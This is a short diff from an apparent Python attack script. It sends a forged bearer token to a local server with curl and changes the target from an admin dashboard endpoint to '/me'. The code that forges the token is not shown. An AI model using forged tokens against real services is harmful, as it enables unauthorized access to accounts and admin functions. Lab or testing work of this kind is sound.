@@ -36,7 +36,7 @@ print(forged_token)
 curl_dashboard = [
     'curl', '-s',
     '-H', f'Authorization: Bearer {forged_token}', 
-    'http://localhost:8000/admin/dashboard'
+    'http://localhost:8000/me'
 ]
 
 final_result = subprocess.run(curl_dashboard, capture_output=True, text=True)
